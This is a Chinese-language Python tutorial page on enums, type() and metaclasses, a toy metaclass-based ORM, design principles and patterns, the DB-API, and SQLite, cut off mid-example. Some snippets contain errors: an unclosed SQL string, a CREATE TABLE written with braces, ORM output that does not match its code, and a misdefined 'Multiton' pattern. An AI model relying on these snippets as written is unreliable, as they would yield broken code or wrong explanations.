Season = enum.Enum('Season', ('SPRING', 'SUMMER', 'FALL', 'WINTER'))
print(Season, type(Season))   # < enum 'Season'> < class 'enum.EnumMeta'>

# 在定义了上面的Season枚举类之后,程序可直接通过枚举值进行前问,这些枚举值都是该枚举的成员,每个成员都有name、value两个属性,其中name属性值为该枚举值的变量名,value代表该枚举值的序号,序号通常从1开始
# 直接访问指定枚举
print(Season.SPRING)        # Season.SPRING
# 访问枚举成员的变量名
print(Season.SPRING.name)   # SPRING
# 访问枚举成员的值
print(Season.SPRING.value)  # 1

# 程序除可直接使用枚举之外,还可通过枚举变量名或枚举值来访问指定枚举对象
# 根据枚举变量名访问枚举对象
print(Season['SUMMER'])     # Season.SUMMER
# 根据枚举值访问枚举对象
print(Season(3))            # Season.FALL

# Python还为枚举提供了一个__members__属性,该属性返回一个dict字典,字典包含了该枚举的所有枚举实例。程序可通过遍历__members__属性来访问枚举的所有实例
# 遍历Season枚举的所有成员
for name, member in Season.__members__.items():
    print(name, '=>', member, ',', member.value)
# 输出:
SPRING => Season.SPRING , 1
SUMMER => Season.SUMMER , 2
FALL => Season.FALL , 3
WINTER => Season.WINTER , 4

### 2、通过继承Enum基类来派生枚举类
# 如果要定义更复杂的枚举,则可通过继承 Enum 来派生枚举类,在这种方式下程序就可以为枚举额外定义方法了

# 通过继承Enum派生了Orientation枚举类,通过这种方式派生的枚举类既可额外定义方法如info(),也可为枚举指定value,value的值默认是 1、2、3、…
import enum
class Orientation(enum.Enum):
    # 为序列值指定value值
    EAST = '东'
    SOUTH = '南'
    WEST = '西'
    NORTH = '北'
    def info(self):
        print('这是一个代表方向%s的枚举' % self.value)

print(Orientation.SOUTH)         # Orientation.SOUTH
print(Orientation.SOUTH.value)   # 南
# 通过枚举变量名访问枚举
print(Orientation['WEST'])       # Orientation.WEST
# 通过枚举值来访问枚举
print(Orientation('南'))         # Orientation.SOUTH
# 调用枚举的info()方法
Orientation.EAST.info()          # 这是一个代表方向东的枚举

# 遍历Orientation枚举的所有成员
for name, member in Orientation.__members__.items():
    print(name, '=>', member, ',', member.value)

# 输出:
EAST => Orientation.EAST , 东
SOUTH => Orientation.SOUTH , 南
WEST => Orientation.WEST , 西
NORTH => Orientation.NORTH , 北

</textarea><pre>
枚举的构造器
枚举也是类,因此枚举也可以定义构造器。为枚举定义构造器之后,在定义枚举实例时必须为构造器参数设置值

</pre><textarea>
import enum
class Gender(enum.Enum):
    MALE = '男', '阳刚之力'
    FEMALE = '女', '柔顺之美'

    def __init__(self, cn_name, desc):
        self._cn_name = cn_name
        self._desc = desc

    @property
    def desc(self):
        return self._desc

    @property
    def cn_name(self):
        return self._cn_name

# 访问FEMALE的name
print('FEMALE的name:', Gender.FEMALE.name)         # FEMALE的name: FEMALE
# 访问FEMALE的value
print('FEMALE的value:', Gender.FEMALE.value)       # FEMALE的value: ('女', '柔顺之美')
# 访问自定义的cn_name属性
print('FEMALE的cn_name:', Gender.FEMALE.cn_name)   # FEMALE的cn_name: 女
# 访问自定义的desc属性
print('FEMALE的desc:', Gender.FEMALE.desc)         # FEMALE的desc: 柔顺之美

</textarea><pre>
当需要定义常量时,一个办法是用大写变量通过整数来定义,好处是简单,缺点是类型是int,并且仍然是变量

JAN = 1
FEB = 2
MAR = 3
...
NOV = 11
DEC = 12

更好的方法是为这样的枚举类型定义一个class类型,然后每个常量都是class的一个唯一实例。Python提供了Enum类来实现这个功能
Enum可以把一组相关常量定义在一个class中,且class不可变,而且成员可以直接比较

</pre><textarea>
from enum import Enum
Month = Enum('Month', ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'))

# 这样就获得了Month类型的枚举类,可以直接使用Month.Jan来引用一个常量,或者枚举它的所有成员:
print(Month.Jan)
for name, member in Month.__members__.items():
    print(name, '=>', member, ',', member.value)   # value属性则是自动赋给成员的int常量,默认从1开始计数

# 输出
Month.Jan
Jan => Month.Jan , 1
Feb => Month.Feb , 2
Mar => Month.Mar , 3
Apr => Month.Apr , 4
May => Month.May , 5
Jun => Month.Jun , 6
Jul => Month.Jul , 7
Aug => Month.Aug , 8
Sep => Month.Sep , 9
Oct => Month.Oct , 10
Nov => Month.Nov , 11
Dec => Month.Dec , 12

</textarea>如果需要更精确地控制枚举类型,可以从Enum派生出自定义类<textarea>
from enum import Enum, unique

@unique               # @unique装饰器可以帮助检查保证没有重复值
class Weekday(Enum):
    Sun = 0           # Sun的value被设定为0
    Mon = 1
    Tue = 2
    Wed = 3
    Thu = 4
    Fri = 5
    Sat = 6

# 访问这些枚举类型可以有若干种方法:既可以用成员名称引用枚举常量,又可以直接根据value的值获得枚举常量
day1 = Weekday.Mon
print(day1)                   # Weekday.Mon
print(Weekday.Tue)            # Weekday.Tue
print(Weekday['Tue'])         # Weekday.Tue
print(Weekday.Tue.value)      # 2
print(Weekday(1))             # Weekday.Mon
print(day1 == Weekday(1))     # True
Weekday(7)                    # 报错ValueError: 7 is not a valid Weekday

for name, member in Weekday.__members__.items():
    print(name, '=>', member)

Sun => Weekday.Sun
Mon => Weekday.Mon
Tue => Weekday.Tue
Wed => Weekday.Wed
Thu => Weekday.Thu
Fri => Weekday.Fri
Sat => Weekday.Sat

</textarea>

<h4>使用元类</h4><pre>
【 type()函数:动态创建类 】
动态语言和静态语言最大的不同就是函数和类的定义不是编译时定义的,而是运行时动态创建的

</pre><textarea>
# 定义一个hello.py模块
class Hello(object):
    def hello(self, name='world'):
        print('Hello, %s.' % name)

# 当Python解释器载入hello模块时就会依次执行该模块的所有语句,执行结果就是动态创建出一个Hello的class对象
from hello import Hello
h = Hello()
h.hello()           # Hello, world.
# 查看变量h的类型
print(type(h))      # < class 'hello.Hello'>
# 查看Hello类本身的类型,Hello类本身的类型是type
print(type(Hello))  # < class 'type'>
print(type(object)) # < class 'type'>

</textarea><pre>
type()函数可以查看一个类型或变量的类型,Hello是一个class,它的类型就是type,而h是一个实例,它的类型就是class Hello

从Python解释器的角度来看,当程序使用class定义Hello类时,也可理解为定义了一个特殊的对象(type类的对象),并将该对象赋值给Hello变量。因此程序使用class定义的所有类都是type类的实例。

实际上Python完全允许使用type()函数(相当于type类的构造器函数)来创建type对象,又由于type类的实例就是类,因此Python可以使用type()函数来动态创建类

class的定义是运行时动态创建的,而创建class的方法就是使用type()函数。
type()函数既可以返回一个对象的类型,又可以创建出新的类型,比如可以通过type()函数创建出Hello类,而无需通过class Hello(object)...的定义
通过type()函数创建的类和直接写class是完全一样的,因为Python解释器遇到class定义时,仅仅是扫描一下class定义的语法,然后调用type()函数创建出class
因此,无论通过哪种方式定义类,程序最终都是创建一个 type 的实例

要创建一个class对象,type()函数依次传入3个参数:
1、class的名称
2、继承的父类集合,由于Python支持多继承,因此此处使用元组指定它的多个父类。即使实际只有一个父类,也需要使用元组语法,必须要多一个逗号
3、参数三:该字典对象为该类绑定的类变量和方法。其中字典的key就是类变量或方法名,如果字典的value是普通值就代表类变量;如果字典的value是函数则代表方法

</pre><pre clas="py">
def fn(self, name='world'):                               # 先定义函数
    print('Hello, %s.' % name)

Hello = type('Hello', (object,), dict(hello=fn, age=6))   # 创建Hello class
h = Hello()
h.hello()           # Hello, world.
print(Hello.age)    # 6
print(type(Hello))  # < class 'type'>
print(type(h))      # < class '__main__.Hello'>

</pre><pre>
正常情况下都用class Xxx...来定义类,但是type()函数也允许动态创建出类来,也就是说动态语言本身支持运行期动态创建类,这和静态语言有非常大的不同,要在静态语言运行期创建类,必须构造源代码字符串再调用编译器,或者借助一些工具生成字节码实现,本质上都是动态编译,会非常复杂。

【 metaclass元类 】
type()函数更适合于动态地创建相对简单的类,如果要创建更复杂的类,要控制类的创建行为,则需要通过MetaClass(元类)的方式

定义了类以后就可以根据这个类创建出实例,所以:先定义类,然后创建实例。
但是如果想创建出类呢？那就必须根据metaclass创建出类,所以:先定义metaclass,然后创建类。
连接起来就是:先定义metaclass,就可以创建类,最后创建实例。

MetaClass(元类)就是创建类的类,即创建类之后再由类来创建实例进行应用。使用元类可以在创建类时动态修改类定义。为了使用元类动态修改类定义,程序需要先定义元类

所以metaclass允许创建类或修改类,可以把类看成是metaclass创建出来的"实例"。
metaclass是Python中非常具有魔术性的对象,它可改变类创建时的行为,这种强大的功能使用起来务必小心,正常情况下不会碰到需要使用metaclass的情况

定义元类时需令其继承与type类,且默认的命名习惯是让类名以MetaClass结尾,以便清楚地表示这是一个metaclass,并且元类中需要定义并实现__new__()方法,一定要有返回值,因为元类在创建类时该__new__()方法将会被调用,用来生成新建的类。
之所有要求元类继承type并实现__new__()方法,是因为在创建类时内部调用了type的__new__()方法为这个类分配内存空间,当内存分配完成后便会调用type的_init__方法初始化
元类的 __new__ 方法的作用是:当程序使用 class 定义新类时,如果指定了元类,那么元类的 __new__ 方法就会被自动执行

</pre>通过list类定义一个add方法的MyList类<textarea>
# metaclass是类的模板,所以必须从`type`类型派生
class ListMetaclass(type):
    # 当前准备创建的类的对象,类的名字,类继承的父类集合,类的方法集合
    def __new__(cls, name, bases, attrs):
        attrs['add'] = lambda self, value: self.append(value)
        return type.__new__(cls, name, bases, attrs)

# 传入关键字参数metaclass时,魔术就生效了,它指示Python解释器在创建MyList时要通过ListMetaclass.__new__()来创建,在此可以修改类的定义,比如加上新的方法,然后返回修改后的定义
class MyList(list, metaclass=ListMetaclass):
    pass

# 测试一下MyList是否可以调用add()方法:
L = MyList()
L.add(1)
print(L)    # [1]

# 而普通的list没有add()方法:
L2 = list()
L2.add(1)   # 报错AttributeError: 'list' object has no attribute 'add'

</textarea><textarea>
# 定义了一个ItemMetaClass,该类继承了type类,并重写了__new__方法,在重写该方法时为目标类动态添加了一个cal_price方法
class ItemMetaClass(type):
    # cls代表动态修改的类,name代表动态修改的类名,bases代表被动态修改的类的所有父类,attr代表被动态修改的类的所有属性、方法组成的字典
    def __new__(cls, name, bases, attrs):
        # 动态为该类添加一个cal_price方法
        attrs['cal_price'] = lambda self: self.price * self.discount
        return type.__new__(cls, name, bases, attrs)

# 定义Book类
class Book(metaclass=ItemMetaClass):
    __slots__ = ('name', 'price', '_discount')

    def __init__(self, name, price):
        self.name = name
        self.price = price

    @property
    def discount(self):
        return self._discount

    @discount.setter
    def discount(self, discount):
        self._discount = discount

# 定义cellPhone类
class CellPhone(metaclass=ItemMetaClass):
    __slots__ = ('price', '_discount' )

    def __init__(self, price):
        self.price = price

    @property
    def discount(self):
        return self._discount

    @discount.setter
    def discount(self, discount):
        self._discount = discount

# 上面程序定义了Book和CellPhone两个类,在定义这两个类时都指定了元类信息,因此当Python解释器在创建这两个类时,ItemMetaClass的__new__方法就会被调用,用于修改这两个类。
# ItemMetaClass类的__new__方法会为目标类动态添加cal_price方法,因此虽然在定义Book、CellPhone类时没有定义cal_price()方法,但这两个类依然有cal_price()方法

b = Book("Python基础教程", 89)
b.discount = 0.76
# 创建Book对象的cal_price()方法
print(b.cal_price())    # 67.64

cp = CellPhone(2399)
cp.discount = 0.85
# 创建CellPhone对象的cal_price()方法
print(cp.cal_price())   # 2039.1499999999999

</textarea><pre>
通过使用元类可以动态修改程序中的一批类,对它们集中进行某种修改。这个功能在开发一些基础性框架时非常有用,程序可以通过使用元类为某一批需要具有通用功能的类添加方法

动态修改有什么意义？直接在MyList定义中写上add()方法不是更简单吗？正常情况下确实应该直接写,通过metaclass修改纯属变态。
但是总会遇到需要通过metaclass修改类定义的,ORM就是一个典型的例子,ORM全称"Object Relational Mapping"即对象-关系映射,就是把关系数据库的一行映射为一个对象,也就是一个类对应一个表,这样写代码更简单,不用直接操作SQL语句。

要编写一个ORM框架,所有的类都只能动态定义,因为只有使用者才能根据表的结构定义出对应的类来

编写底层模块的第一步,就是先把调用接口写出来,比如使用者如果使用这个ORM框架,想定义一个User类来操作对应的数据库表User

</pre><textarea>
class User(Model):
    # 定义类的属性到列的映射:
    id = IntegerField('id')
    name = StringField('username')
    email = StringField('email')
    password = StringField('password')

# 创建一个实例:
u = User(id=12345, name='Michael', email='test@orm.org', password='my-pwd')
# 保存到数据库:
u.save()

</textarea><pre>
其中父类Model和属性类型StringField、IntegerField是由ORM框架提供的,剩下的魔术方法比如save()全部由metaclass自动完成。虽然metaclass的编写会比较复杂,但ORM的使用者用起来却异常简单。

</pre>现在就按上面的接口来实现该ORM<textarea>
# 首先来定义Field类,它负责保存数据库表的字段名和字段类型
class Field(object):

    def __init__(self, name, column_type):
        self.name = name
        self.column_type = column_type

    def __str__(self):
        return '<%s:%s>' % (self.__class__.__name__, self.name)

# 在Field的基础上,进一步定义各种类型的Field,比如StringField,IntegerField等
class StringField(Field):

    def __init__(self, name):
        super(StringField, self).__init__(name, 'varchar(100)')

class IntegerField(Field):

    def __init__(self, name):
        super(IntegerField, self).__init__(name, 'bigint')

# 下一步就是编写最复杂的ModelMetaclass
class ModelMetaclass(type):

    def __new__(cls, name, bases, attrs):
        if name=='Model':
            return type.__new__(cls, name, bases, attrs)
        print('Found model: %s' % name)
        mappings = dict()
        for k, v in attrs.items():
            if isinstance(v, Field):
                print('Found mapping: %s ==> %s' % (k, v))
                mappings[k] = v
        for k in mappings.keys():
            attrs.pop(k)
        attrs['__mappings__'] = mappings # 保存属性和列的映射关系
        attrs['__table__'] = name # 假设表名和类名一致
        return type.__new__(cls, name, bases, attrs)

# 以及基类Model:
class Model(dict, metaclass=ModelMetaclass):

    def __init__(self, **kw):
        super(Model, self).__init__(**kw)

    def __getattr__(self, key):
        try:
            return self[key]
        except KeyError:
            raise AttributeError(r"'Model' object has no attribute '%s'" % key)

    def __setattr__(self, key, value):
        self[key] = value

    def save(self):
        fields = []
        params = []
        args = []
        for k, v in self.__mappings__.items():
            fields.append(v.name)
            params.append('?')
            args.append(getattr(self, k, None))
        sql = 'insert into %s (%s) values (%s)' % (self.__table__, ','.join(fields), ','.join(params))
        print('SQL: %s' % sql)
        print('ARGS: %s' % str(args))

</textarea><pre>
当用户定义一个class User(Model)时,Python解释器首先在当前类User的定义中查找metaclass,如果没有找到就继续在父类Model中查找metaclass,找到了就使用Model中定义的metaclass的ModelMetaclass来创建User类,也就是说metaclass可以隐式地继承到子类,但子类自己却感觉不到。

在ModelMetaclass中,一共做了几件事情:
1、排除掉对Model类的修改;
2、在当前类如User中查找定义的类的所有属性,如果找到一个Field属性就把它保存到一个__mappings__的dict中,同时从类属性中删除该Field属性,否则容易造成运行时错误(实例的属性会遮盖类的同名属性);
3、把表名保存到__table__中,这里简化为表名默认为类名。

在Model类中就可以定义各种操作数据库的方法,比如save(),delete(),find(),update等
实现了save()方法,把一个实例保存到数据库中。因为有表名,属性到字段的映射和属性值的集合,就可以构造出INSERT语句

编写代码试试:
u = User(id=12345, name='Michael', email='test@orm.org', password='my-pwd')
u.save()

输出如下:
Found model: User
Found mapping: email ==> < StringField:email>
Found mapping: password ==> < StringField:password>
Found mapping: id ==> < IntegerField:uid>
Found mapping: name ==> < StringField:username>
SQL: insert into User (password,email,username,id) values (?,?,?,?)
ARGS: ['my-pwd', 'test@orm.org', 'Michael', 12345]

可以看到,save()方法已经打印出了可执行的SQL语句,以及参数列表,只需要真正连接到数据库,执行该SQL语句,就可以完成真正的功能。
不到100行代码就通过metaclass实现了一个精简的ORM框架

</pre>
</div>

<div id="design">
<h4>Python七大原则,24种设计模式</h4><pre>
七大设计原则：
1、单一职责原则(SINGLE RESPONSIBILITY PRINCIPLE)：一个类负责一项职责.
2、里氏替换原则(LISKOV SUBSTITUTION PRINCIPLE)：继承与派生的规则.(子类可替换父类)
3、依赖倒转原则(DEPENDENCE INVERSION PRINCIPLE)：高层模块不应该依赖低层模块,二者都应该依赖其抽象;抽象不应该依赖细节;细节应该依赖抽象。即针对接口编程,不要针对实现编程。
4、接口隔离原则(INTERFACE SEGREGATION PRINCIPLE)：建立单一接口,不要建立庞大臃肿的接口,尽量细化接口,接口中的方法尽量少。
5、迪米特法则(LOW OF DEMETER)：高内聚低耦合 – high cohesion low coupling
6、开闭原则(OPEN CLOSE PRINCIPLE)：一个软件实体如类、模块和函数应该对扩展开放,对修改关闭。
7、组合/聚合复用原则(Composition/Aggregation Reuse Principle(CARP))：尽量使用组合和聚合少使用继承的关系来达到复用的原则。

24种设计模式：
一、创建型模式
1、抽象工厂模式(Abstract factory pattern): 提供一个接口,用于创建相关或依赖对象的家族,而不需要指定具体类
2、生成器模式(Builder pattern): 使用生成器模式封装一个产品的构造过程,并允许按步骤构造,将一个复杂对象的构建与它的表示分离,使得同样的构建过程可以创建不同的表示
3、工厂模式(factory method pattern): 定义了一个创建对象的接口,但由子类决定要实例化的类是哪一个,工厂方法让类把实例化推迟到子类
4、原型模式(prototype pattern): 当创建给定类的实例过程很昂贵或很复杂时,就使用原形模式
5、单例模式(Singleton pattern): 确保一个类只有一个实例, 并提供全局访问点
6、多例模式(Multition pattern): 在一个解决方案中结合两个或多个模式,以解决一般或重复发生的问题

二、结构型模式
1、适配器模式(Adapter pattern): 将一个类的接口,转换成客户期望的另一个接口,适配器让原本接口不兼容的类可以合作无间,对象适配器使用组合,类适配器使用多重继承
2、桥接模式(Bridge pattern): 使用桥接模式通过将实现和抽象放在两个不同的类层次中而使它们可以独立改变
3、组合模式(composite pattern): 允许你将对象组合成树形结构来表现"整体/部分"层次结构. 组合能让客户以一致的方式处理个别对象以及对象组合
4、装饰者模式(decorator pattern): 动态地将责任附加到对象上,若要扩展功能,装饰者提供了比继承更有弹性的替代方案
5、外观模式(facade pattern): 提供了一个统一的接口,用来访问子系统中的一群接口,外观定义了一个高层接口,让子系统更容易使用
6、亨元模式(Flyweight Pattern): 如想让某个类的一个实例能用来提供许多"虚拟实例",就使用蝇量模式
7、代理模式(Proxy pattern): 为另一个对象提供一个替身或占位符以控制对这个对象的访问

三、行为型模式
1、责任链模式(Chain of responsibility pattern): 通过责任链模式,可以为某个请求创建一个对象链,每个对象依序检查此请求并对其进行处理或者将它传给链中的下一个对象
2、命令模式(Command pattern): 将"请求"封闭成对象,以便使用不同的请求,队列或者日志来参数化其他对象,命令模式也支持可撤销的操作
3、解释器模式(Interpreter pattern): 使用解释器模式为语言创建解释器.
4、迭代器模式(iterator pattern): 提供一种方法顺序访问一个聚合对象中的各个元素,而又不暴露其内部的表示.
5、中介者模式(Mediator pattern) : 使用中介者模式来集中相关对象之间复杂的沟通和控制方式.
6、备忘录模式(Memento pattern): 当你需要让对象返回之前的状态时(例如用户请求"撤销"),使用备忘录模式
7、观察者模式(observer pattern): 在对象之间定义一对多的依赖,这样一来当一个对象改变状态,依赖它的对象都会收到通知,并自动更新
8、状态模式(State pattern): 允许对象在内部状态改变时改变它的行为,对象看起来好象改了它的类.
9、策略模式(strategy pattern): 定义了算法族分别封闭起来,让它们之间可以互相替换,此模式让算法的变化独立于使用算法的客户
10、模板方法模式(Template pattern): 在一个方法中定义一个算法的骨架, 而将一些步骤延迟到子类中,模板方法使得子类可以在不改变算法结构的情况下重新定义算法中的某些步骤.
11、访问者模式(visitor pattern): 当你想要为一个对象的组合增加新的能力, 且封装并不重要时, 就使用访问者模式.

</pre>
</div>

<div id="database">
<h3>Python 操作 MySQL 数据库</h3><pre>
程序运行的时候,数据都是在内存中的。当程序终止的时候,通常都需要将数据保存到磁盘上,无论是保存到本地磁盘,还是通过网络保存到服务器上,最终都会将数据写入磁盘文件。

如何定义数据的存储格式就是一个大问题:
1、可以用一个文本文件保存,一行保存一个条数据
2、可以用JSON格式保存,也是文本文件
3、可以定义其他各种保存格式

问题:
存储和读取需要自己实现,JSON还是标准,自己定义的格式就各式各样了
不能做快速查询,只有把数据全部读到内存中才能自己遍历,但有时候数据的大小远远超过了内存比如蓝光电影40GB的数据,根本无法全部读入内存

为了便于程序保存和读取数据,而且能直接通过条件快速查询到指定的数据,就出现了数据库(Database)这种专门用于集中存储和查询的软件

数据库适用于保存数据量巨大且具有复杂关系的数据,Python为操作不同的数据库提供了不同的模块,这些模块内API的设计大同小异,因此掌握Python的一个数据库模块之后,再看其他数据库模块时就会有似曾相识的感觉。最常使用Python操作SQLite内置数据库和开源的MySQL数据库。

Python3.6默认内置了操作SQLite数据库的模块,但如果Python程序需要操作MySQL数据库,则需要自行下载操作MySQL数据库的Python模块

MySQL是Web世界中使用最广泛的数据库服务器。SQLite的特点是轻量级、可嵌入,但不能承受高并发访问,适合桌面和移动应用。而MySQL是为服务器端设计的数据库,能承受高并发访问,同时占用的内存也远远大于SQLite。
此外MySQL内部有多种数据库引擎,最常用的引擎是支持数据库事务的InnoDB

</pre>

<h4>Python数据库API(DB API)</h4><pre>
虽然Python需要为操作不同的数据库使用不同的模块,但不同的数据库模块基本都遵守Python制订的DB API协议,,为开发人员提供了数据库应用编程接口,目前该协议的最新版本是2.0,因此这些数据库模块有很多操作其实都是相同的

Python数据库接口支持非常多的数据库,可以选择适合项目的数据库:
GadFly
mSQL
MySQL
PostgreSQL
Microsoft SQL Server 2000
Informix
Interbase
Oracle
Sybase

不同的数据库需要下载不同的DB API模块,例如需要访问Oracle数据库和Mysql数据,需要下载Oracle和MySQL数据库模块。

DB-API是一个规范,定义了一系列必须的对象和数据库存取方式, 以便为各种各样的底层数据库系统和多种多样的数据库接口程序提供一致的访问接口
Python的DB-API为大多数的数据库实现了接口,使用它连接各数据库后就可以用相同的方式操作各数据库。

Python DB-API使用流程:
1、引入API模块
2、获取与数据库的连接
3、执行SQL语句和存储过程
4、关闭数据库连接

【 全局变量 】
Python推荐支持DB API 2.0的数据库模块都应该提供如下3个全局变量,这些全局变量体现了该数据库API模块的对外的编程风格
1、apilevel
该全局变量显示数据库模块的API版本号。对于支持DB API 2.0版本的数据库模块来说,该变量值通常就是2.0。如果这个变量不存在则可能该数据库模块暂时不支持DB API2.0,应该考虑选择使用支持该数据库的其他数据库模块。

2、threadsafety
该全局变量指定数据库模块的线程安全等级,该等级值为0～3 ,其中3代表该模块完全是线程安全的;1表示该模块具有部分线程安全性,线程可以共享该模块,但不能共享连接;0则表示线程完全不能共享该模块。

3、paramstyle
该全局变量指定当SQL语句需要参数时,可以使用哪种风格的参数,该变量可能返回如下变量值:
(1) format:表示在SQL语句中使用Python标准的格式化字符串代表参数。例如在程序中需要参数的地方使用%s,接下来程序即可为这些参数指定参数值。
(2) pyformat:表示在SQL语句中使用扩展的格式代码代表参数。比如使用%(name),这样即可使用包含key为name的字典为该参数指定参数值。
(3) qmark:表示在SQL语句中使用问号(?)代表参数。在SQL语句中有几个参数,全部用问号代替。
(4) numeric:表示在SQL语句中使用数字占位符(:N)代表参数。例如:1代表一个参数,:2也表示一个参数,这些数字相当于参数名,因此它们不一定需要连续。
(5) named:表示在SQL语句中使用命名占位符(:name)代表参数。例如:name代表一个参数,:age也表示一个参数。

【 数据库API的核心类 】
遵守DB API 2.0协议的数据库模块通常会提供一个connect()函数,该函数用于连接数据库并返回数据库连接对象。

数据库连接对象通常会具有如下方法和属性:
cursor(factory=Cursor):打开游标,返回一个游标对象,游标对象是Python DB API的核心对象,该对象主要用于执行各种SQL语句,包括DDL、DML、select查询语句等,使用游标执行不同的SQL语句返回不同的数据
commit():提交事务。
rollback():回滚事务。
close():关闭数据库连接。
isolation_level:返回或设置数据库连接中事务的隔离级别。
in_transaction:判断当前是否处于事务中。
errorhandler(cxn, cur, errcls, errval)

游标对象通常会具有如下方法和属性:
execute(sql[, parameters]):执行SQL语句,parameters参数用于为SQL语句中的参数指定值。返回值count同cursor.rowcount
executemany(sql, seq_of_parameters):重复执行SQL语句,可以通过seq_of_parameters序列为SQL语句中的参数指定值,该序列有多少个元素,SQL语句被执行多少次。
executescript(sql_script):这不是DB API 2.0的标准方法,某些数据库API模块中可能没有这个方法,可以直接执行包含多条SQL语句的SQL脚本或字符串
fetchone():获取查询结果集的下一行,如果没有下一行则返回None。
fetchmany(size=cursor.arraysize):返回查询结果集的下N行组成的列表,如果没有更多的数据行则返回空列表。
fetchall():返回查询结果集的全部行组成的列表。
close():关闭游标。
rowcount:该只读属性返回受SQL语句影响的行数,对于executemany()方法所修改的记录条数也可通过该属性获取。最后一次execute()操作返回或影响的行数
lastrowid:该只读属性可获取最后修改行的rowid,如果数据库不支持行id则默认返回None
arraysize:用于设置或获取fetchmany()默认获取的记录条数,默认1,有些数据库模块没有该属性。
description:该只读属性可获取最后一次查询返回的所有列的信息,返回游标活动状态(一个包含七个元素的元组):(name,type_code,display_size,internal_size,precision,scale,null_ok);只有name和type_code是必须提供的
connection:该只读属性返回创建游标的数据库连接对象,有些数据库模块没有该属性。
callproc(func[,args]):调用一个存储过程
messages:游标执行后数据库返回的信息列表(元组集合) (可选)
next():使用迭代对象得到结果集的下一行(可选;类似fetchone(),参阅__iter__())
nextset():移到下一个结果集 (如果支持的话)
rownumber:当前结果集中游标的索引 (以行为单位,从0开始) (可选)
setinput- sizes(sizes):设置输入最大值 (必须有,但具体实现是可选的)
setoutput- size(size[,col]):设置大列的缓冲区大写(必须有,但具体实现是可选的)

</pre>游标本身是可迭代对象,因此程序不需要使用fetchone()来逐行获取查询结果,而是直接使用for循环来遍历游标获取查询结果集<textarea>
conn = sqlite3.connect('first.db')
c = conn.cursor()
c.execute('select * from user_tb)
# 采用for循环遍历游标
for row in c: print(row)
conn.commit()
c.close()
conn.close()

</textarea><pre>
Python的DB API 2.0由一个connect()开始,一共涉及数据库连接和游标两个核心API,它们的分工如下:
数据库连接:用于获取游标、控制事务。
游标:执行各种SQL语句。

【 使用Python DB API 2.0操作数据库的基本流程 】
1、调用connect()方法打开数据库连接,该方法返回数据库连接对象。
2、通过数据库连接对象打开游标。
3、使用游标执行SQL语句,包括DDL(负责创建表、修改表或删除表)、DML(insert、update、delete语句)、select查询语句等,如果执行的是查询语句则处理查询数据。
4、关闭游标。
5、关闭数据库连接。

</pre>
</div>

<div id="SQLite">
<h4>使用SQLite</h4><pre>
SQLite是一种嵌入式数据库,其数据库就是一个name.db的二进制文件。SQLite是C写的,且体积很小,所以经常被集成到各种应用程序中,甚至在iOS和Android的App中都可以集成。
Python就内置了SQLite3,所以在Python中使用SQLite,不需要安装任何东西,直接使用。

Python定义了一套操作数据库的API接口,任何数据库要连接到Python,只需要提供符合Python标准的数据库驱动即可。
由于SQLite的驱动内置在Python标准库中,所以可以直接来操作SQLite数据库。

SQLite数据库所支持的SQL语句与MySQL大致相同,完全可以把已有的MySQL经验移植到SQLite数据库上。Python程序提示某条SQL语句有语法错误时,最好先利用SQLite数据库管理工具来测试这条语句,以保证这条SQL语句的语法正确

表是数据库中存放关系数据的集合,一个数据库里面通常都包含多个表,比如学生的表,班级的表,学校的表等,表和表之间通过外键关联。

SQLite内部只支持NULL、INTEGER、REAL(浮点数)、TEXT(文本)和BLOB(大二进制对象)这5种数据类型,但实际上SQLite完全可以接受varchar(n)、char(n)、decimal(p, s)等数据类型,只不过SQLite会在运算或保存时将它们转换为上面5种数据类型中相应的类型

SQLite允许把各种类型的数据保存到任何类型的字段中,不用关心声明该字段所使用的数据类型,例如可以把字符串类型的值存入INTEGER类型的字段中,也可以把数值类型的值存入布尔类型的字段中,但有一种情况例外,被定义为"INTEGER PRIMARY KEY"的字段只能存储64位整数,当使用这种字段保存除整数以外的其他类型的数据时SQLite会产生错误
由于SQLite允许在存入数据时忽略底层数据列实际的数据类型,因此在编写建表语句时可以省略各数据列后面的类型声明。例如对于SQLite数据库如下SQL语句也是正确的:

</pre><textarea>
create table my_test
{
    _id_integer primary key autoincrement,
    name,
    pass,
    gender
};

</textarea><pre>
由于Python的SQLite数据库API默认是开启了事务的,因此必须提交事务,否则程序对数据库所做的修改(包括插入数据、修改数据、删除数据)不会生效

不要试图使用executemany()方法执行select 语句,否则程序将会报错:ProgrammingError:executemany() can only execute DML statements

为了简化编程,SQLite数据库模块还为数据库连接对象提供了如下3个方法:
execute(sql[, parameters]):执行一条SQL语句。
executemany(sql[, parameters]):根据序列重复执行SQL语句。
executescript(sql_script):执行SQL脚本。
这3个方法与游标对象所包含的3个方法完全相同《数据库连接对象的这3个方法都不是DB API 2.0的标准方法,它们只是游标对象的3个方法的快捷方式,因此在用法上与游标对象的3个方法完全相同

</pre><textarea>
# 导入SQLite驱动,导入访问SQLite的模块
import sqlite3

# 使用connect()打开或创建并连接到一个SQLite数据库,数据库文件是test.db二进制文件,如果文件不存在会自动在当前目录创建相应的文件即对应于数据库,如果程序希望创建内存中的数据库则只需将first.db改为特殊名称 :memory: 即可
conn = sqlite3.connect('test.db')
# 创建一个Cursor,获取游标
cursor = conn.cursor()
# 执行一条SQL语句,创建user表:
cursor.execute('create table user (id varchar(20) primary key, name varchar(20))')   # < sqlite3.Cursor object at 0x10f8aa260>
# 继续执行一条SQL语句,插入一条记录:
cursor.execute('insert into user (id, name) values (\'1\', \'Michael\')')            # < sqlite3.Cursor object at 0x10f8aa260>
# 通过rowcount获得插入的行数:
print(cursor.rowcount)   # 1
# 关闭Cursor:
cursor.close()
# 提交事务:
conn.commit()
# 关闭Connection:
conn.close()

# 查询记录:fetchone()、fetchmany(n)、fetchall()
conn = sqlite3.connect('test.db')
cursor = conn.cursor()
# 执行查询语句:
cursor.execute('select * from user where id=?', ('1',))  # < sqlite3.Cursor object at 0x10f8aa340>
# 获得查询结果集:
values = cursor.fetchall()
print(values)           # [('1', 'Michael')]
cursor.close()

cursor = conn.cursor()
cursor.execute('select * from user where id=?', ('1',))
print('查询返回的记录数:', cursor.rowcount)
# 通过游标的description属性获取列信息,col[0]为字段名
for col in (cursor.description):
    print(col[0], end='\t')
print('\n')

while True:
    row = cursor.fetchone()      # 获取一行记录,每行数据都是一个元组
    if not row : break           # 如果抓取的row为None,退出循环
    print(row, end=' ')          # ('1', 'Michael')
print('\n')
cursor.close()

cursor = conn.cursor()
cursor.execute('select * from user where id=?', ('1',))
while True:
